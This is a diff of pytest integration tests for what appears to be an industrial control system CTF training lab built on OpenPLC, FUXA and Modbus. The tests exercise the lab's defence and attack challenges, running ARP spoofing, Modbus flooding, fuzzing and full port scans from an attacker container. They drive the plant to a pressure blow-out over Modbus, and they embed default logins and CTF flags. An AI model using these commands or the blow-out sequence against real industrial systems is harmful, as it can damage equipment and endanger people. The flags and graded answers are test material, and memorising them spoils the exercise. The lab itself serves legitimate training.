+    EtherNet/IP answer again, 8443 is reachable and the heartbeat toggles.
+    The second test runs the README's Reset command (settings back in
+    openplc.db, docker restart of the PLC) and waits for the whole PLC.
+
+    The web login is the shipped openplc/openplc, like TestPasswordAttack;
+    a board whose password was changed fails here on purpose.
+    """
+
+    WEB = f"http://{SERVER_IP}:{OPENPLC_PORT}"
+    SIDE_DOORS = (102, 20000, 44818)
+    FIND_PLC = "docker ps --filter name=openplc --format '{{.Names}}' | head -n1"
+    FIND_ATTACKER = "docker ps --filter name=attack-shell --format '{{.Names}}' | head -n1"
+
+    # -- helpers -----------------------------------------------------------
+
+    def _plc(self):
+        code, out = self._admin(self.FIND_PLC)
+        assert code == 0 and out.strip(), out
+        return out.strip()
+
+    def _readme(self, heading):
+        return _readme_block("defense_unused_protocols", heading).replace("<openplc>", self._plc())
+
+    def _web(self):
+        session = requests.Session()
+        r = session.post(f"{self.WEB}/login", data={"username": "openplc", "password": "openplc"},
+                         timeout=READ_TIMEOUT, allow_redirects=False)
+        assert r.status_code == 302 and "login" not in r.headers.get("Location", ""), (
+            "cannot log in to OpenPLC with openplc/openplc")
+        return session
+
+    def _save_settings(self, s7, dnp3, enip):
+        """Submit OpenPLC's Settings form like a browser: an unticked server's
+        port field is disabled and not sent; everything else is kept."""
+        session = self._web()
+        page = session.get(f"{self.WEB}/settings", timeout=READ_TIMEOUT).text
+
+        def value(field):
+            m = re.search(rf"id='{field}' name='{field}' value='([^']*)'", page)
+            assert m, f"no {field} on the settings page"
+            return m.group(1)
+
+        form = {"device_hostname": value("device_hostname"),
+                "modbus_server_port": value("modbus_server_port"),
+                "snap7_run_text": "true" if s7 else "false",
+                "auto_run_text": "true",
+                "slave_polling_period": value("slave_polling_period"),
+                "slave_timeout": value("slave_timeout")}
+        if dnp3:
+            form["dnp3_server_port"] = "20000"
+        if enip:
+            form["enip_server_port"] = "44818"
+        if 'id="pstorage_thread" type="checkbox" checked' in page:
+            form["pstorage_thread_poll"] = value("pstorage_thread_poll")
+        r = session.post(f"{self.WEB}/settings", data=form, timeout=30, allow_redirects=False)
+        assert r.status_code == 302, r.text[:300]
+
+    def _open_ports(self, ports):
+        """The ports among `ports` that accept a TCP connect at 172.18.0.3.
+
+        Asked from the admin shell, on the board's host network like the verify
+        module, because the ports published on SERVER_IP go through Docker's
+        userland proxy, which accepts a connection even when nothing listens
+        behind it."""
+        probe = ("import socket\n"
+                 f"for p in {sorted(ports)!r}:\n"
+                 "    s = socket.socket(); s.settimeout(3)\n"
+                 "    print(p, 'OPEN' if s.connect_ex(('172.18.0.3', p)) == 0 else 'CLOSED')\n"
+                 "    s.close()\n")
+        code, out = self._admin(f"python3 -c {shlex.quote(probe)}")
+        assert code == 0, out
+        return {int(p) for p, state in re.findall(r"^(\d+) (OPEN|CLOSED)$", out, re.M) if state == "OPEN"}
+
+    def _wait(self, ports, want_open, timeout=60):
+        deadline = time.monotonic() + timeout
+        while time.monotonic() < deadline:
+            is_open = self._open_ports(ports)
+            if (is_open == set(ports)) if want_open else not is_open:
+                return True
+            time.sleep(1)
+        return False
+
+    def _rest_reachable(self):
+        return self._open_ports([8443]) == {8443}
+
+    @staticmethod
+    def _heartbeat_toggles():
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        try:
+            deadline = time.monotonic() + 30
+            while not client.connect():
+                assert time.monotonic() < deadline, "Modbus did not come back"
+                time.sleep(1)
+            seen = set()
+            end = time.monotonic() + 4
+            while time.monotonic() < end and len(seen) < 2:
+                result = modbus_call(client, client.read_coils, 0, count=1)
+                if not result.isError():
+                    seen.add(bool(result.bits[0]))
+                time.sleep(0.2)
+            return len(seen) == 2
+        finally:
+            client.close()
+
+    def _verify(self):
+        r = requests.post(f"{self.BASE}/ctf/verify/defense_unused_protocols", json={}, timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    @staticmethod
+    def _failed(result):
+        return {c["name"] for c in result.get("checks", []) if not c["passed"]}
+
+    def _iptables(self):
+        code, out = self._admin(f"docker exec {self._plc()} iptables -S INPUT")
+        assert code == 0, out
+        return out
+
+    def _reopen(self):
+        """Undo whatever the test left: README's way, then a guard for the 102 rule."""
+        self._save_settings(s7=True, dnp3=True, enip=True)
+        rules = self._iptables()
+        if "--dport 8443" in rules:
+            self._admin(self._readme("### Undoing it"))
+        if "--dport 102" in rules:
+            self._admin(f"docker exec {self._plc()} iptables -D INPUT -p tcp --dport 102 "
+                        "-j REJECT --reject-with tcp-reset")
+
+    def _assert_reopened(self):
+        assert self._wait(self.SIDE_DOORS + (MODBUS_PORT, OPENPLC_PORT), True), \
+            "S7, DNP3 or EtherNet/IP did not come back"
+        import snap7  # tests/requirements.txt
+        client = snap7.client.Client()
+        client.connect(SERVER_IP, 0, 1, S7_SERVER_PORT)
+        try:
+            assert client.get_connected()
+        finally:
+            client.disconnect()
+        assert self._rest_reachable(), "port 8443 is still blocked"
+        assert "8443" not in self._iptables()
+        assert self._heartbeat_toggles(), "the PLC's heartbeat stopped"
+
+    # -- tests -------------------------------------------------------------
+
+    def test_side_doors_are_closed_verified_and_reopened(self):
+        assert self._wait(self.SIDE_DOORS, True, timeout=10), "the PLC is not as shipped"
+        before = self._without("defense_unused_protocols")
+        try:
+            assert not self._verify()["success"]
+
+            # README step 2: the inventory sees three Modbus clients and idle side doors.
+            code, out = self._admin(f"docker exec -i {self._plc()} python3 - < "
+                                    "/CybICS/training/defense_unused_protocols/plc_ports.py")
+            assert code == 0, out
+            modbus = next(line for line in out.splitlines() if line.strip().startswith("502 "))
+            for client in ("hwio", "fuxa", "opcua"):
+                assert client in modbus, out
+            for port in ("102", "8443", "20000", "44818"):
+                line = next(line for line in out.splitlines() if line.strip().startswith(port + " "))
+                assert "nobody connected" in line, out
+
+            # A firewall rule in front of the running S7 server is not enough.
+            code, out = self._admin(self._readme("4. **Block the REST API.**"))
+            assert code == 0, out
+            code, out = self._admin(f"docker exec {self._plc()} iptables -I INPUT -p tcp "
+                                    "--dport 102 -j REJECT --reject-with tcp-reset")
+            assert code == 0, out
+            self._save_settings(s7=True, dnp3=False, enip=False)
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+            assert self._failed(result) == {"S7comm (port 102) switched off"}, result
+            code, out = self._admin(f"docker exec {self._plc()} iptables -D INPUT -p tcp "
+                                    "--dport 102 -j REJECT --reject-with tcp-reset")
+            assert code == 0, out
+
+            # README step 3 in full: the S7 checkbox too.
+            self._save_settings(s7=False, dnp3=False, enip=False)
+            assert self._wait(self.SIDE_DOORS, False, timeout=15)
+
+            # README step 5: from the attacker only Modbus and the web interface are left.
+            code, out = self._admin(f"docker exec $({self.FIND_ATTACKER}) nmap -p- -T4 172.18.0.3")
+            assert code == 0, out
+            assert sorted(re.findall(r"^(\d+)/tcp\s+open", out, re.M), key=int) == ["502", "8080"], out
+
+            result = self._verify()
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._reopen()
+            self._restore(before)
+        self._assert_reopened()
+
+    def test_readme_reset_brings_the_shipped_plc_back(self):
+        assert self._wait(self.SIDE_DOORS, True, timeout=10), "the PLC is not as shipped"
+        try:
+            self._save_settings(s7=False, dnp3=False, enip=False)
+            code, out = self._admin(self._readme("4. **Block the REST API.**"))
+            assert code == 0, out
+            assert self._wait(self.SIDE_DOORS, False, timeout=15)
+
+            code, out = self._admin(_readme_block("defense_unused_protocols", "### Reset"),
+                                    timeout=120)
+            assert code == 0, out
+        finally:
+            if not self._wait(self.SIDE_DOORS, True, timeout=90):
+                self._reopen()
+        self._assert_reopened()
+        code, out = self._admin(
+            f"docker exec {self._plc()} sqlite3 'file:/CybICS/OpenPLC_v3/webserver/openplc.db?mode=ro' "
+            "\"SELECT Key || '=' || Value FROM Settings WHERE Key IN ('snap7','Dnp3_port','Enip_port')\"")
+        assert code == 0 and sorted(out.split()) == ["Dnp3_port=20000", "Enip_port=44818", "snap7=true"], out
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestDefenseFirewalls(_CtfProgress):
+    """
+    Modbus Firewall Rules and Network Segmentation end to end, with the
+    README's own commands in the admin shell. Both checks probe the real
+    connections: a rule set that cuts the OPC-UA gateway off from Modbus
+    (what the README once said) and a DROP for the attacker on an unrelated
+    port must be refused, the README's rules must pass. The PLC's and the
+    OPC-UA server's INPUT chains are empty on a shipped stack and are emptied
+    again in a finally block.
+    """
+
+    PLC = "docker ps --filter name=openplc --format '{{.Names}}' | head -n1"
+    OPCUA = "docker ps --filter name=opcua --format '{{.Names}}' | head -n1"
+
+    def _name(self, find):
+        code, out = self._admin(find)
+        assert code == 0 and out.strip(), out
+        return out.strip()
+
+    def _in(self, container, command):
+        code, out = self._admin(f"docker exec {container} {command}")
+        assert code == 0, out
+        return out
+
+    def _verify(self, challenge_id):
+        r = requests.post(f"{self.BASE}/ctf/verify/{challenge_id}", json={}, timeout=90)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    @staticmethod
+    def _failed(result):
+        return {c["name"] for c in result.get("checks", []) if not c["passed"]}
+
+    def _empty_chains(self, *containers):
+        for container in containers:
+            self._in(container, "iptables -F INPUT")
+            assert self._in(container, "iptables -S INPUT").strip() == "-P INPUT ACCEPT"
+
+    def test_modbus_firewall_must_keep_the_plant_clients(self):
+        plc = self._name(self.PLC)
+        assert self._in(plc, "iptables -S INPUT").strip() == "-P INPUT ACCEPT", \
+            "the PLC's INPUT chain is not empty; this test expects a shipped stack"
+        before = self._without("defense_firewall")
+        try:
+            # Only hwio and FUXA: the OPC-UA gateway is cut off.
+            for source in ("172.18.0.2", "172.18.0.4"):
+                self._in(plc, f"iptables -A INPUT -p tcp --dport 502 -s {source} -j ACCEPT")
+            self._in(plc, "iptables -A INPUT -p tcp --dport 502 -j DROP")
+            result = self._verify("defense_firewall")
+            assert not result["success"]
+            assert self._failed(result) == {"Plant's Modbus clients still allowed"}, result
+            self._empty_chains(plc)
+
+            readme = (Path(__file__).resolve().parent.parent / "training" / "defense_firewall"
+                      / "README.md").read_text(encoding="utf-8")
+            rules = [line.strip() for line in readme.split("## Solution", 1)[1].splitlines()
+                     if line.strip().startswith("iptables ")]
+            assert any("172.18.0.5" in r for r in rules), rules
+            for rule in rules:
+                self._in(plc, rule)
+            result = self._verify("defense_firewall")
+            assert result["success"], result
+            assert result.get("flag") == "CybICS(f1r3w4ll_h4rd3n3d)"
+        finally:
+            self._empty_chains(plc)
+            self._restore(before)
+
+    def test_network_segmentation_is_probed_not_read(self):
+        plc, opcua = self._name(self.PLC), self._name(self.OPCUA)
+        for container in (plc, opcua):
+            assert self._in(container, "iptables -S INPUT").strip() == "-P INPUT ACCEPT", \
+                f"{container}'s INPUT chain is not empty; this test expects a shipped stack"
+        before = self._without("defense_network_segmentation")
+        try:
+            for container in (plc, opcua):
+                self._in(container, "iptables -A INPUT -s 172.18.0.100 -p tcp --dport 102 -j DROP")
+            result = self._verify("defense_network_segmentation")
+            assert not result["success"], result
+            self._empty_chains(plc, opcua)
+
+            for container in (plc, opcua):
+                self._in(container, "iptables -A INPUT -s 172.18.0.100 -j DROP")
+            result = self._verify("defense_network_segmentation")
+            assert result["success"], result
+            assert result.get("flag") == "CybICS(n3tw0rk_s3gm3nt3d)"
+
+            undo = _readme_block("defense_network", "### Undoing it")
+            for line in undo.splitlines():
+                line = line.replace("<openplc_container>", plc).replace("<opcua_container>", opcua)
+                code, out = self._admin(line)
+                assert code == 0, out
+            for container in (plc, opcua):
+                assert self._in(container, "iptables -S INPUT").strip() == "-P INPUT ACCEPT"
+        finally:
+            self._empty_chains(plc, opcua)
+            self._restore(before)
 
 
 # ===============================================================================
@@ -657,4 +2491,296 @@ def test_password_attack_readme_exists():
     assert 'OpenPLC' in content, "README missing OpenPLC attack information"
     assert 'FUXA' in content, "README missing FUXA attack information"
     assert 'CybICS(0penPLC)' in content, "README missing OpenPLC flag"
-    assert 'CybICS(FU##A)' in content, "README missing FUXA flag"
+    # FUXA Password Attack is answer-graded: its page shows this README, so
+    # the flag must not be in it (it comes from Verify).
+    assert 'CybICS(FU##A)' not in content, "README gives away the FUXA flag"
+
+
+# ===============================================================================
+# Flags off the HMI: Password Attack and Physical Process
+# ===============================================================================
+
+HPT_REGISTER = 1126
+BLOWOUT_REGISTER = 1134
+COMPRESSOR_COIL, SYSTEM_VALVE_COIL, GST_SUPPLY_COIL = 1, 2, 3
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestFlagsOffTheHmi(_CtfProgress):
+    """
+    FUXA sends its whole project to anyone without a login (GET /api/project),
+    so no flag may live in it. Password Attack and Physical Process used to
+    show theirs as HMI text; their flags now come from verify modules (see
+    tests/test_hmi_flags.py). This runs both against the live stack: the
+    anonymous project holds no flag, the recovered FUXA login is graded, and
+    a real blow-out, driven over Modbus the way the HMI's buttons do it, is
+    what returns the Physical Process flag.
+
+    The blow-out run takes several minutes: the plant moves about one bar a
+    second, from the normal band to 220 and back under 100. Afterwards the
+    plant is back in automatic mode in its normal band and the CTF progress
+    is as before.
+    """
+
+    FUXA = f"http://{SERVER_IP}:{FUXA_PORT}"
+    RISE_TIMEOUT = 600
+    DRAIN_TIMEOUT = 600
+
+    def _flags(self):
+        config = Path(__file__).resolve().parent.parent / "software" / "landing" / "ctf_config.json"
+        return {c["id"]: c["flag"] for cat in json.loads(config.read_text())["categories"].values()
+                for c in cat["challenges"]}
+
+    def _verify(self, challenge_id, answers=None):
+        body = {"answers": answers} if answers is not None else {}
+        r = requests.post(f"{self.BASE}/ctf/verify/{challenge_id}", json=body, timeout=30)
+        assert r.status_code == 200, r.text[:200]
+        return r.json()
+
+    def test_the_anonymous_hmi_project_holds_no_flag(self):
+        r = requests.get(f"{self.FUXA}/api/project", timeout=READ_TIMEOUT)
+        assert r.status_code == 200 and "devices" in r.json()
+        leaked = sorted(cid for cid, flag in self._flags().items() if flag in r.text)
+        assert not leaked, f"FUXA hands out the flags of {leaked} without a login"
+        assert "CybICS(" not in r.text
+
+    def test_the_recovered_fuxa_login_returns_the_flag(self):
+        # The graded login is the one FUXA really accepts.
+        r = requests.post(f"{self.FUXA}/api/signin", json={"username": "admin", "password": "123456"},
+                          timeout=READ_TIMEOUT)
+        assert r.status_code == 200 and r.json().get("data", {}).get("token"), r.text[:200]
+
+        before = self._without("password_attack")
+        try:
+            wrong = self._verify("password_attack", {"username": "operator", "password": "operator"})
+            assert wrong["success"] is False and "flag" not in wrong
+            right = self._verify("password_attack", {"username": "admin", "password": "123456"})
+            assert right["success"] is True, right
+            assert right["flag"] == self._flags()["password_attack"]
+        finally:
+            self._restore(before)
+
+    @staticmethod
+    def _plant(client):
+        result = modbus_call(client, client.read_holding_registers, HPT_REGISTER,
+                             count=BLOWOUT_REGISTER - HPT_REGISTER + 1)
+        assert not result.isError(), result
+        return result.registers[0], result.registers[-1]   # hpt, blow-out sensor
+
+    @staticmethod
+    def _set(client, manual=None, **coils):
+        if manual is not None:
+            assert not modbus_call(client, client.write_register, MANUAL_REGISTER, manual).isError()
+        for coil, value in coils.items():
+            address = {"compressor": COMPRESSOR_COIL, "valve": SYSTEM_VALVE_COIL,
+                       "supply": GST_SUPPLY_COIL}[coil]
+            assert not modbus_call(client, client.write_coil, address, value).isError()
+
+    @pytest.mark.slow
+    def test_a_real_blowout_returns_the_flag(self):
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        assert client.connect(), "Modbus not reachable to drive the plant"
+        before = self._without("physical_process")
+        try:
+            hpt, blowout = self._plant(client)
+            assert not blowout and hpt < 200, f"the plant is not in its normal state (HPT {hpt})"
+            calm = self._verify("physical_process")
+            assert calm["success"] is False and "flag" not in calm
+            assert calm["checks"][0]["passed"], calm   # the plant was read, it just is not blowing out
+
+            # What the operator does on the SystemView: manual, compressor on,
+            # system valve shut, supply on. Repeated in the loop, the way an
+            # operator would press a button again.
+            deadline = time.monotonic() + self.RISE_TIMEOUT
+            while True:
+                self._set(client, manual=1, compressor=True, valve=False, supply=True)
+                hpt, blowout = self._plant(client)
+                if blowout:
+                    break
+                assert time.monotonic() < deadline, f"no blow-out after {self.RISE_TIMEOUT}s (HPT {hpt})"
+                time.sleep(3)
+
+            result = self._verify("physical_process")
+            assert result["success"] is True, result
+            assert result["flag"] == self._flags()["physical_process"]
+        finally:
+            try:
+                # Drain through the system valve, then hand back to the PLC
+                # inside its band: automatic keeps the valve shut above 100.
+                deadline = time.monotonic() + self.DRAIN_TIMEOUT
+                while True:
+                    self._set(client, manual=1, compressor=False, valve=True)
+                    hpt, _ = self._plant(client)
+                    if hpt < 95 or time.monotonic() > deadline:
+                        break
+                    time.sleep(3)
+                self._set(client, manual=0)
+                assert hpt < 95, f"the HPT did not drain back to its band (HPT {hpt})"
+            finally:
+                client.close()
+                self._restore(before)
+
+
+# ===============================================================================
+# Plant Physics Sandbox (plant_physics_sandbox)
+# ===============================================================================
+
+class TestPlantPhysicsSandbox(_CtfProgress):
+    """
+    Plant Physics Sandbox end to end on the running landing page: the Theory
+    lesson the README sends the student to renders with the sandbox, the page
+    loads the widget script byte for byte as committed (so the model the
+    student runs is the one test_plant_model_parity.py checked), verify
+    refuses the tempting wrong predictions without a flag and hands it out
+    for the answers tests/test_plant_physics_sandbox_check.py derived from
+    the real hwio tick. Nothing touches the plant; only the CTF progress
+    changes and it is put back.
+    """
+
+    def _verify(self, answers):
+        r = requests.post(f"{self.BASE}/ctf/verify/plant_physics_sandbox", json={"answers": answers},
+                          timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def test_lesson_serves_the_committed_sandbox(self):
+        r = requests.get(f"{self.BASE}/theory/plant_physics_sandbox", timeout=READ_TIMEOUT)
+        assert r.status_code == 200, r.status_code
+        assert 'data-widget="plant-sandbox"' in r.text
+        assert "CybICS(" not in r.text
+        script = re.search(r'src="([^"]*theory-widgets\.js[^"]*)"', r.text)
+        assert script, "the lesson does not load theory-widgets.js"
+        js = requests.get(f"{self.BASE}{script.group(1)}", timeout=READ_TIMEOUT)
+        assert js.status_code == 200
+        committed = (Path(__file__).resolve().parent.parent / "software" / "landing" / "static"
+                     / "js" / "theory-widgets.js").read_bytes()
+        assert js.content == committed, "landing serves a stale theory-widgets.js: rebuild landing"
+
+    def test_predictions_earn_the_flag(self):
+        from test_plant_physics_sandbox_check import RIGHT
+        before = self._without("plant_physics_sandbox")
+        try:
+            for wrong in ({**RIGHT, "settle_hpt": "110"},      # the PLC's guard, not the plant's
+                          {**RIGHT, "blowout_tick": "130"},
+                          {**RIGHT, "spoof_ticks": "1"},       # "one scan, one tick"
+                          {**RIGHT, "spoof_ticks": "31"},      # the normal cycle after it
+                          {**RIGHT, "freeze_register": "1128"}):
+                result = self._verify(wrong)
+                assert not result["success"] and "flag" not in result, (wrong, result)
+            result = self._verify({**RIGHT, "freeze_register": "%MW106"})
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._restore(before)
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestAdvancedSecurity(_CtfProgress):
+    """
+    The IDS-backed challenges end to end from the attack shell, with the
+    shipped scripts and the commands the READMEs give: the ARP man-in-the-
+    middle, the HPT write flood (Flood & Overwrite) and the diagnostic
+    fuzzing (Fuzzing Modbus) earn their flags through Verify, and the port
+    scan and Modbus flood make the IDS rule stats reveal the Detect flags.
+    UART needs the board.
+
+    Verify must refuse before the attack when the rule has no alert from the
+    last 10 minutes. MitM used to pass with no attack at all: the IDS kept
+    every MAC an address was ever announced with, so recreating a container
+    was enough to raise arp_spoof forever; and all three passed on any alert
+    still in the IDS buffer, however old. The ARP spoofer restores both
+    caches on SIGINT; the floods only overwrite HPT and GST readings, which
+    hwio writes again every cycle; the fuzzer sends 40 diagnostic requests.
+    CTF progress is put back.
+    """
+
+    IDS = f"http://{SERVER_IP}:{IDS_PORT}"
+    FIND_ATTACKER = TestDefenseUnusedProtocols.FIND_ATTACKER
+
+    def _attack(self, module, command, timeout=120):
+        code, out = self._admin(self.FIND_ATTACKER)
+        assert code == 0 and out.strip(), out
+        return self._admin(f"docker exec -w /CybICS/training/{module} {out.strip()} "
+                           f"sh -c {shlex.quote(command)}", timeout=timeout)
+
+    def _stats(self):
+        return requests.get(f"{self.IDS}/api/rules/stats", timeout=READ_TIMEOUT).json()
+
+    def _flag(self, challenge_id):
+        config = Path(__file__).resolve().parent.parent / "software" / "landing" / "ctf_config.json"
+        return next(c["flag"]
+                    for cat in json.loads(config.read_text())["categories"].values()
+                    for c in cat["challenges"] if c["id"] == challenge_id)
+
+    def _submit(self, challenge_id, flag):
+        return requests.post(f"{self.BASE}/ctf/submit", timeout=READ_TIMEOUT,
+                             json={"challenge_id": challenge_id, "flag": flag}).json()
+
+    def _recent(self, rule, window=600):
+        """Whether the IDS raised rule within window seconds, on the IDS's own clock."""
+        entry = self._stats().get(rule, {})
+        if not entry.get("count"):
+            return False
+        now = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()["now"]
+        age = (datetime.fromisoformat(now) - datetime.fromisoformat(entry["last_seen"]))
+        return age.total_seconds() <= window
+
+    @pytest.mark.parametrize("challenge_id,rule,module,command", [
+        ("mitm", "arp_spoof", "mitm",
+         "timeout -s INT 10 python3 arp_spoof.py 172.18.0.4 172.18.0.3"),
+        ("flood_overwrite", "modbus_flood", "flood_overwrite",
+         "python3 flooding_hpt.py 172.18.0.3 -d 8 >/dev/null 2>&1; true"),
+        ("fuzzingMB", "modbus_diagnostic", "fuzzingMB",
+         "python3 modbus_fuzzer.py 172.18.0.3 --fc 0x08 --count 40"),
+    ])
+    def test_attack_earns_the_verify_flag(self, challenge_id, rule, module, command):
+        """
+        The IDS-backed checks credit an alert only from the last 10 minutes.
+        Before the attack, Verify must refuse whenever the rule has not fired
+        in that window -- never, or only long ago (an older alert the IDS
+        still keeps across CTF resets). If an earlier test fired it moments
+        ago the refusal cannot be shown here; tests/test_ids_rule_window.py
+        covers that case with a fake IDS.
+        """
+        before = self._without(challenge_id)
+        try:
+            if not self._recent(rule):
+                r = requests.post(f"{self.BASE}/ctf/verify/{challenge_id}", json={},
+                                  timeout=30).json()
+                assert not r["success"] and "flag" not in r, r
+                assert "10 minutes" in json.dumps(r), r
+            code, out = self._attack(module, command, timeout=180)
+            assert code == 0, out[-500:]
+            if rule == "arp_spoof":
+                assert "Restoring the ARP caches" in out, out[-500:]
+            deadline = time.time() + 15
+            while not self._recent(rule, window=60) and time.time() < deadline:
+                time.sleep(1)
+            r = requests.post(f"{self.BASE}/ctf/verify/{challenge_id}", json={},
+                              timeout=30).json()
+            assert r["success"] and r.get("flag") == self._flag(challenge_id), r
+        finally:
+            self._restore(before)
+
+    @pytest.mark.parametrize("challenge_id,rule,module,command", [
+        ("detect_basic", "port_scan", "detect_basic", "python3 recon.py 172.18.0.3"),
+        ("detect_overwrite", "modbus_flood", "detect_overwrite",
+         "timeout 5 python3 override.py 172.18.0.3 >/dev/null 2>&1; true"),
+    ])
+    def test_attack_reveals_the_rule_flag(self, challenge_id, rule, module, command):
+        before = self._without(challenge_id)
+        try:
+            code, out = self._attack(module, command, timeout=180)
+            assert code == 0, out[-500:]
+            if rule == "port_scan":
+                assert "Port: 502\tState: open" in out, out[-800:]
+            deadline = time.time() + 15
+            while "flag" not in self._stats()[rule] and time.time() < deadline:
+                time.sleep(1)
+            flag = self._stats()[rule].get("flag")
+            assert flag == self._flag(challenge_id), self._stats()[rule]
+            wrong = self._submit(challenge_id, flag.replace("3", "e"))
+            assert not wrong["success"], wrong
+            assert self._submit(challenge_id, flag)["success"]
+        finally:
+            self._restore(before)
